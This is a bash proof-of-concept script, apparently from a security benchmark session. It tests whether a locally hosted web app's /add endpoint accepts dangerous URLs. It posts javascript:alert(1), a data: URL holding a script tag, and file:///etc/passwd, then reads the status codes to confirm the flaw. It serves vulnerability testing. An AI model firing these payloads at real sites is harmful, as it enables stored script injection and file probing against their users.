#!/bin/bash
# POC: Demonstrates URL validation bypass on /add endpoint accepting dangerous protocols and invalid URLs without server-side validation
# Target: ./repo
# Created: 2025-11-07T19:41:39.668Z
# Session: benchmark-XBEN-075-24-mhp935fu

# URL Validation Bypass POC - Tests dangerous protocol acceptance on /add endpoint
# This script demonstrates that the /add endpoint accepts dangerous URL schemes
# without proper server-side validation

TARGET_URL="http://127.0.0.1:5000"
RESULTS=()

echo "========================================"
echo "URL Validation Bypass POC"
echo "Testing /add endpoint with dangerous URLs"
echo "========================================"
echo ""

# Test 1: JavaScript protocol URL
echo "[*] Test 1: JavaScript protocol URL (javascript:alert(1))"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/add" \
  -d 'name=TestJS&url=javascript:alert(1)' \
  -H "Content-Type: application/x-www-form-urlencoded")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "302" ]; then
  echo "✓ VULNERABLE: Server accepted javascript: protocol"
  RESULTS+=("PASS: javascript: protocol accepted")
else
  echo "✗ Server rejected javascript: protocol"
  RESULTS+=("FAIL: javascript: protocol")
fi
echo ""

# Test 2: Data URL with embedded HTML/JS
echo "[*] Test 2: Data URL (data:text/html,<script>alert(1)</script>)"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/add" \
  -d 'name=TestData&url=data:text/html,<script>alert(1)</script>' \
  -H "Content-Type: application/x-www-form-urlencoded")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "302" ]; then
  echo "✓ VULNERABLE: Server accepted data: protocol"
  RESULTS+=("PASS: data: protocol accepted")
else
  echo "✗ Server rejected data: protocol"
  RESULTS+=("FAIL: data: protocol")
fi
echo ""

# Test 3: Relative path
echo "[*] Test 3: Relative path (/path/to/url)"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/add" \
  -d 'name=TestRelative&url=/path/to/url' \
  -H "Content-Type: application/x-www-form-urlencoded")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "302" ]; then
  echo "✓ VULNERABLE: Server accepted relative path"
  RESULTS+=("PASS: relative path accepted")
else
  echo "✗ Server rejected relative path"
  RESULTS+=("FAIL: relative path")
fi
echo ""

# Test 4: URL without protocol
echo "[*] Test 4: URL without protocol (example.com)"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/add" \
  -d 'name=TestNoProtocol&url=example.com' \
  -H "Content-Type: application/x-www-form-urlencoded")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "302" ]; then
  echo "✓ VULNERABLE: Server accepted URL without protocol"
  RESULTS+=("PASS: URL without protocol accepted")
else
  echo "✗ Server rejected URL without protocol"
  RESULTS+=("FAIL: URL without protocol")
fi
echo ""

# Test 5: File protocol
echo "[*] Test 5: File protocol (file:///etc/passwd)"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/add" \
  -d 'name=TestFile&url=file:///etc/passwd' \
  -H "Content-Type: application/x-www-form-urlencoded")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "302" ]; then
  echo "✓ VULNERABLE: Server accepted file: protocol"
  RESULTS+=("PASS: file: protocol accepted")
else
  echo "✗ Server rejected file: protocol"
  RESULTS+=("FAIL: file: protocol")
fi
echo ""

# Summary
echo "========================================"
echo "SUMMARY"
echo "========================================"
for result in "${RESULTS[@]}"; do
  echo "$result"
done
echo ""

# Count vulnerabilities
VULN_COUNT=$(printf '%s\n' "${RESULTS[@]}" | grep -c "PASS:")
if [ "$VULN_COUNT" -ge 3 ]; then
  echo "✓ VULNERABILITY CONFIRMED: Server accepts multiple dangerous URL schemes"
  exit 0
else
  echo "✗ Could not confirm URL validation bypass"
  exit 1
fi